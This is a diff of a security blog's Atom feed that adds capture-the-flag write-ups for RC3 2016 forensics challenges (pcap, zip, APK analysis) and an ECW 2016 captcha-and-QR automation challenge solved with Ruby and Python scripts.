@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://rawsec.ml/"/>
-  <updated>2016-11-22T18:36:45.393Z</updated>
+  <updated>2016-11-22T21:02:36.559Z</updated>
   <id>http://rawsec.ml/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://rawsec.ml/en/RC3CTF-2016-forensics-50-somepang/"/>
     <id>http://rawsec.ml/en/RC3CTF-2016-forensics-50-somepang/</id>
     <published>2016-11-21T23:00:00.000Z</published>
-    <updated>2016-11-22T18:36:45.393Z</updated>
+    <updated>2016-11-22T21:02:36.559Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
 <thead>
@@ -46,7 +46,7 @@
 <li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/389" target="_blank" rel="external">link</a></li>
 </ul>
 <h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
-<p>   Examine the file and find the flag.</p>
+<p>Examine the file and find the flag.</p>
 </blockquote>
 <h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>First, open the pcap file with Wireshark. We can see 98906 ICMP frames with the same length. Look at the data, it’s always the same character repeated in each request/reply.<br>The last packet data character is “=” so we can imagine that stuff encoded in base64.<br>Let capture all characters and decode it to a file :</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># author : Chill3d</span></div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</div><div class="line"></div><div class="line">pcap=rdpcap(<span class="string">"./somepang.pcap"</span> )</div><div class="line">string=<span class="string">""</span></div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">for</span> packet <span class="keyword">in</span> pcap:</div><div class="line">    i=i+<span class="number">1</span></div><div class="line">    <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>):</div><div class="line">        string+=str(packet)[<span class="number">-2</span>:]</div><div class="line"></div><div class="line">file_t=open(<span class="string">"flag"</span>,<span class="string">"w"</span> )</div><div class="line">file_t.write(base64.b64decode(string))</div><div class="line">file_t.close()</div><div class="line"></div><div class="line"><span class="keyword">print</span> string</div><div class="line"><span class="keyword">print</span> base64.b64decode(string)</div></pre></td></tr></table></figure>
@@ -55,6 +55,140 @@
 <p>Open it with a picture viewer :</p>
 <p><img src="https://i.imgbox.com/0usuyDAn.jpg" alt="image"></p>
 <p>Flag : <code>RC3-2016-PANG-ME-LIKE-ONE-OF-YOU-FRENCH-GORILLAZ</code></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
+    
+    </summary>
+    
+      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
+    
+      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>RC3 CTF - 300 - Breaking News - Forensics</title>
+    <link href="http://rawsec.ml/en/RC3CTF-2016-forensics-300-breaking-news/"/>
+    <id>http://rawsec.ml/en/RC3CTF-2016-forensics-300-breaking-news/</id>
+    <published>2016-11-21T23:00:00.000Z</published>
+    <updated>2016-11-22T20:59:05.124Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Chill3d</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<li><strong>Name</strong> : RC3 CTF 2016</li>
+<li><strong>Website</strong> : <a href="http://ctf.rc3.club/" target="_blank" rel="external">http://ctf.rc3.club/</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/389" target="_blank" rel="external">link</a></li>
+</ul>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.C.</p>
+<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>For this challenge, we have a tar.gz file which is containing 20 zip files. These ones are storing txt files. There is a story is these txt files but we can’t see any <code>2016</code> string so the flag isn’t here…<br>So, why don’t examinate the content of zip files to see if we missed something… In a directory where the 20 zip files are stored, we typed : <code>strings *</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">GINg</div><div class="line">Chapter0.txtUT</div><div class="line">L+^=</div><div class="line">&lt;U&lt;i%[</div><div class="line">GINg</div><div class="line">Chapter0.txtUT</div><div class="line">Chapter10.txtUT</div><div class="line">Chapter10.txtUT</div><div class="line">MTYtRFUK</div><div class="line">Chapter11.txtUT</div><div class="line">;X c</div><div class="line">`s;</div><div class="line">(yCc</div><div class="line">_/_PK</div><div class="line">Chapter11.txtUT</div><div class="line">Chapter12.txtUT</div><div class="line">Wow, these Queebloid folks do not fool around.</div><div class="line">Chapter12.txtUT</div><div class="line">Chapter13.txtUT</div><div class="line">H,Q/V(</div><div class="line">,Q(NM</div><div class="line">Chapter13.txtUT</div><div class="line">Chapter14.txtUT</div><div class="line">0gZ+</div><div class="line">?6(U</div><div class="line">Chapter14.txtUT</div><div class="line">Chapter15.txtUT</div><div class="line">Y*mO</div><div class="line">.Xt]</div><div class="line">3oc$M8e</div><div class="line">Chapter15.txtUT</div><div class="line">S1lGCg==</div><div class="line">Chapter16.txtUT</div><div class="line">2VD%</div><div class="line">Chapter16.txtUT</div><div class="line">Chapter17.txtUT</div><div class="line">6[in</div><div class="line">Chapter17.txtUT</div><div class="line">Chapter18.txtUT</div><div class="line">,QH,(HM,*V(</div><div class="line">Chapter18.txtUT</div><div class="line">QkxTCg==</div><div class="line">Chapter19.txtUT</div><div class="line">*Cut to black*</div><div class="line">Chapter19.txtUT</div><div class="line">Chapter1.txtUT</div><div class="line">D&#123;N1</div><div class="line">!Rk\</div><div class="line">^hE3n</div><div class="line">Chapter1.txtUT</div><div class="line">GIKZo=f</div><div class="line">Chapter2.txtUT</div><div class="line">GIKZo=f</div><div class="line">Chapter2.txtUT</div><div class="line">Chapter3.txtUT</div><div class="line">Chapter3.txtUT</div><div class="line">Chapter4.txtUT</div><div class="line">Chapter4.txtUT</div><div class="line">UkMK</div><div class="line">Chapter5.txtUT</div><div class="line">\DjX</div><div class="line">pZzU</div><div class="line">NR!R9</div><div class="line">K4r&gt;&amp;</div><div class="line">Chapter5.txtUT</div><div class="line">Chapter6.txtUT</div><div class="line">Chapter6.txtUT</div><div class="line">Chapter7.txtUT</div><div class="line">Chapter7.txtUT</div><div class="line">Chapter8.txtUT</div><div class="line">Chapter8.txtUT</div><div class="line">Chapter9.txtUT</div><div class="line">K)VH,JU(</div><div class="line">Chapter9.txtUT</div><div class="line">My0yMAo=</div></pre></td></tr></table></figure>
+<p>Some base64 encoded strings ?! Let decode <code>MTYtRFUK</code> + <code>S1lGCg==</code> + <code>QkxTCg==</code> + <code>UkMK</code> + <code>My0yMAo=</code>:</p>
+<ul>
+<li>MTYtRFUK : <em>16-DU</em></li>
+<li>S1lGCg== : <em>KYF</em></li>
+<li>QkxTCg== : <em>BLS</em></li>
+<li>UkMK : <em>RC</em></li>
+<li>My0yMAo= : <em>3-20</em></li>
+</ul>
+<p>So, if we put strings in order of chapter number, we obtain the flag <code>RC3-2016-DUKYFBLS</code>.</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
+    
+    </summary>
+    
+      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
+    
+      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>RC3 CTF - 100 - My Lil Droid - Forensics</title>
+    <link href="http://rawsec.ml/en/RC3CTF-2016-forensics-100-My-Lil-Droid/"/>
+    <id>http://rawsec.ml/en/RC3CTF-2016-forensics-100-My-Lil-Droid/</id>
+    <published>2016-11-21T23:00:00.000Z</published>
+    <updated>2016-11-22T21:05:09.729Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Chill3d</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<li><strong>Name</strong> : RC3 CTF 2016</li>
+<li><strong>Website</strong> : <a href="http://ctf.rc3.club/" target="_blank" rel="external">http://ctf.rc3.club/</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/389" target="_blank" rel="external">link</a></li>
+</ul>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
+<p>Sometimes not all files are needed.<br>Hint:<br>– You probably don’t have to run it</p>
+</blockquote>
+<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>For this challenge, we have an apk file nammed <code>youtube.apk</code>. First, let decode it with apktool to see usefull file like AndroidManifest.xml : <code>apktool d youtube.apk</code>.</p>
+<p>We know that we are seeking a RC3-2016 flag, so go search in files we extracted :</p>
+<ul>
+<li><code>cd youtube</code>  </li>
+<li><code>find . -type f -exec grep RC3-2016 {} \;</code> =&gt; No result  </li>
+<li><code>find . -type f -exec grep RC3 {} \;</code> give this output :</li>
+</ul>
+<pre><code>new-instance v1, Ljava/util/zip/CRC32;
+invoke-direct {v1}, Ljava/util/zip/CRC32;-&gt;&lt;init&gt;()V
+invoke-virtual {v1, v4, v8, v0}, Ljava/util/zip/CRC32;-&gt;update([BII)V
+invoke-virtual {v1}, Ljava/util/zip/CRC32;-&gt;getValue()J
+</code></pre><p>Let’s see if we can find 2016 string somewhere :<br><code>find . -type f -exec grep 2016 {} \;</code> give a loot of string and the last one is a bit weird : <code>UkMz-2016-R09URU0yMQ==</code></p>
+<p>Decode this in base64 : flag = <code>RC3-2016-GOTEM21</code>.</p>
 ]]></content>
     
     <summary type="html">
@@ -564,11 +698,11 @@
   </entry>
   
   <entry>
-    <title>ECW - 50 - Ave, César! - Cryptography</title>
-    <link href="http://rawsec.ml/en/ECW-2016-ave-cesar/"/>
-    <id>http://rawsec.ml/en/ECW-2016-ave-cesar/</id>
+    <title>ECW - 150 - Dilemme - Misc</title>
+    <link href="http://rawsec.ml/en/ECW-2016-dilemme/"/>
+    <id>http://rawsec.ml/en/ECW-2016-dilemme/</id>
     <published>2016-11-05T23:00:00.000Z</published>
-    <updated>2016-11-07T21:44:48.247Z</updated>
+    <updated>2016-11-07T21:44:52.883Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
 <thead>
@@ -593,13 +727,21 @@
 <li><strong>Format</strong> : Jeopardy - Student</li>
 </ul>
 <h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This was not Caesar as title suggested but Vigenere code, a troll I guess…</p>
-<p>With some frequency analysis and bruteforce we found:</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>For this challenge we needed to solve a captcha and a QR code as faster as possible.</p>
+<p>For this I wrote a ruby script:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'base64'</span> <span class="comment"># to decode base64 images</span></div><div class="line"><span class="keyword">require</span> <span class="string">'zxing'</span> <span class="comment"># to solve qr code</span></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line"><span class="comment">### Crawling the website to get the base64 QRCode ###</span></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/divers200'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform</div><div class="line"><span class="comment">#puts c.body_str</span></div><div class="line"></div><div class="line"><span class="comment">### Parse the output ###</span></div><div class="line">qrcode_b64 = c.body_str.match(<span class="regexp">/QRCode" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">qrcode_file = <span class="string">'qrcode.png'</span></div><div class="line">captcha_b64 = c.body_str.match(<span class="regexp">/Captcha" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">captcha_file = <span class="string">'captcha.png'</span></div><div class="line"></div><div class="line"><span class="comment">### QRCode : base64 to png ###</span></div><div class="line">File.open(qrcode_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(qrcode_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">### Captcha : base64 to png ###</span></div><div class="line">File.open(captcha_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(captcha_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">### QRCode : png to text string ###</span></div><div class="line">qrcode_answer = ZXing.decode qrcode_file</div><div class="line">puts <span class="string">'QRCode : '</span>.concat(qrcode_answer)</div><div class="line"></div><div class="line"><span class="comment">### Captcha : png to text string ###</span></div><div class="line">captcha_answer = <span class="string">`python2 myCaptchaSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'Captcha : '</span>.concat(captcha_answer)</div><div class="line"></div><div class="line"><span class="comment">### Send the answer ###</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line">c.http_post(Curl::PostField.content(<span class="string">'captcha'</span>, captcha_answer),</div><div class="line">            Curl::PostField.content(<span class="string">'qrcode'</span>, qrcode_answer),</div><div class="line">            Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">c.perform</div><div class="line">puts c.body_str.match(<span class="regexp">/&lt;center&gt;(.*)&lt;\/center&gt;/</span>).captures[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="comment"># Redo the whole process one more time</span></div><div class="line">qrcode_b64 = c.body_str.match(<span class="regexp">/QRCode Win" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">qrcode_file = <span class="string">'qrcode.png'</span></div><div class="line">captcha_b64 = c.body_str.match(<span class="regexp">/Captcha Win" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">captcha_file = <span class="string">'captcha.png'</span></div><div class="line">File.open(qrcode_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(qrcode_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line">File.open(captcha_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(captcha_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line">qrcode_answer = ZXing.decode qrcode_file</div><div class="line">puts <span class="string">'QRCode : '</span>.concat(qrcode_answer)</div><div class="line">captcha_answer = <span class="string">`python2 myCaptchaSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'Captcha : '</span>.concat(captcha_answer)</div><div class="line">c.http_post(Curl::PostField.content(<span class="string">'captcha'</span>, captcha_answer),</div><div class="line">            Curl::PostField.content(<span class="string">'qrcode'</span>, qrcode_answer),</div><div class="line">            Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">c.perform</div><div class="line">puts c.body_str.match(<span class="regexp">/&lt;center&gt;(.*)&lt;\/center&gt;/</span>).captures[<span class="number">0</span>]</div><div class="line"></div><div class="line">puts <span class="string">"Flag : "</span> + captcha_answer + qrcode_answer</div><div class="line"></div><div class="line"><span class="comment">### Wait for avoiding Jruby to crash ###</span></div><div class="line">sleep(<span class="number">0</span>.<span class="number">5</span>)</div><div class="line"></div><div class="line"><span class="comment">### Remove temporary file ###</span></div><div class="line">File.delete(qrcode_file)</div><div class="line">File.delete(captcha_file)</div><div class="line">File.delete(<span class="string">"output.gif"</span>)</div></pre></td></tr></table></figure>
+<p>Script is working but <code>curb</code> is not very quick and the <code>ZXing</code> ruby gem is just a port of the java version of <code>ZXing</code> with Jruby and is amazingly slow and buggy! So the whole script process take 9 seconds. That’s too slow!</p>
+<p>Let’s try to optimize the execution speed with more quicker tools:</p>
 <ul>
-<li>The key was: <code>contest</code>.</li>
-<li>And the message was: <code>remporte cette epreuve grace au flag ecw accolade ouvrante d huit c trois un cinq cinq c huit six a six eef un huit db huit quatre cinq trois un sept b huit b cinq a sept deux accolade fermante. les chiffres et caracteres speciaux ont ete remplaces par leur nom textuel.</code>.</li>
-<li>That gave us the flag: <code>ECW{d8c3155c86a6eef18db845317b8b5a72}</code>.</li>
+<li>replace <code>curb</code> gem using libcurb directly with <code>curl</code></li>
+<li>replace <code>ZXing</code> with a custom script using <code>PIl</code> and <code>pytesseract</code></li>
 </ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'base64'</span> <span class="comment"># to decode base64 images</span></div><div class="line"></div><div class="line"><span class="comment">### Crawling the website to get the base64 QRCode ###</span></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/divers200'</span></div><div class="line"></div><div class="line">cookies = <span class="string">'session=mySessionCookie'</span></div><div class="line">body_str = <span class="string">`curl https://challenge-ecw.fr/chals/divers200 --cookie '<span class="subst">#&#123;cookies&#125;</span>'`</span></div><div class="line"></div><div class="line"><span class="comment">### Parse the output ###</span></div><div class="line">qrcode_b64 = body_str.match(<span class="regexp">/QRCode" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">qrcode_file = <span class="string">'qrcode.png'</span></div><div class="line">captcha_b64 = body_str.match(<span class="regexp">/Captcha" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">captcha_file = <span class="string">'captcha.png'</span></div><div class="line"></div><div class="line"><span class="comment">### QRCode : base64 to png ###</span></div><div class="line">File.open(qrcode_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(qrcode_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">### Captcha : base64 to png ###</span></div><div class="line">File.open(captcha_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(captcha_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">### QRCode : png to text string ###</span></div><div class="line">qrcode_answer = <span class="string">`python2 myQRCodeSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'QRCode : '</span>.concat(qrcode_answer)</div><div class="line"></div><div class="line"><span class="comment">### Captcha : png to text string ###</span></div><div class="line">captcha_answer = <span class="string">`python2 myCaptchaSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'Captcha : '</span>.concat(captcha_answer)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">### Send the answer ###</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line">server_answer = <span class="string">`curl https://challenge-ecw.fr/chals/divers200 --cookie '<span class="subst">#&#123;cookies&#125;</span>' -X POST -F "captcha=<span class="subst">#&#123;captcha_answer&#125;</span>" -F "qrcode=<span class="subst">#&#123;qrcode_answer&#125;</span>" -F "nonce=<span class="subst">#&#123;nonce&#125;</span>"`</span></div><div class="line">puts <span class="string">'&gt;&gt;&gt; '</span> + server_answer.match(<span class="regexp">/&lt;center&gt;(.*)&lt;\/center&gt;/</span>).captures[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="comment"># Redo the whole process one more time</span></div><div class="line">qrcode_b64 = server_answer.match(<span class="regexp">/QRCode Win" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">qrcode_file = <span class="string">'qrcode.png'</span></div><div class="line">captcha_b64 = server_answer.match(<span class="regexp">/Captcha Win" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">captcha_file = <span class="string">'captcha.png'</span></div><div class="line">File.open(qrcode_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(qrcode_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line">File.open(captcha_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(captcha_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line">qrcode_answer = <span class="string">`python2 myQRCodeSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'QRCode : '</span>.concat(qrcode_answer)</div><div class="line">captcha_answer = <span class="string">`python2 myCaptchaSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'Captcha : '</span>.concat(captcha_answer)</div><div class="line"></div><div class="line">puts <span class="string">"Flag : "</span> + captcha_answer + qrcode_answer</div><div class="line"></div><div class="line"><span class="comment">### Remove temporary file ###</span></div><div class="line">File.delete(qrcode_file)</div><div class="line">File.delete(captcha_file)</div><div class="line">File.delete(<span class="string">"output.gif"</span>)</div></pre></td></tr></table></figure>
+<p>Here is my custom captcha solver <code>myCaptchaSolver.py</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">from</span> pytesseract <span class="keyword">import</span> image_to_string</div><div class="line"></div><div class="line">im = Image.open(<span class="string">"captcha.png"</span>)</div><div class="line">im = im.convert(<span class="string">"P"</span>)</div><div class="line">im2 = Image.new(<span class="string">"P"</span>,im.size,<span class="number">255</span>)</div><div class="line"></div><div class="line">im = im.convert(<span class="string">"P"</span>)</div><div class="line"></div><div class="line">temp = &#123;&#125;</div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(im.size[<span class="number">1</span>]):</div><div class="line">  <span class="keyword">for</span> y <span class="keyword">in</span> range(im.size[<span class="number">0</span>]):</div><div class="line">    pix = im.getpixel((y,x))</div><div class="line">    temp[pix] = pix</div><div class="line">    <span class="keyword">if</span> pix == <span class="number">1</span>: <span class="comment"># these are the numbers to get</span></div><div class="line">      im2.putpixel((y,x),<span class="number">0</span>)</div><div class="line"></div><div class="line">im2.save(<span 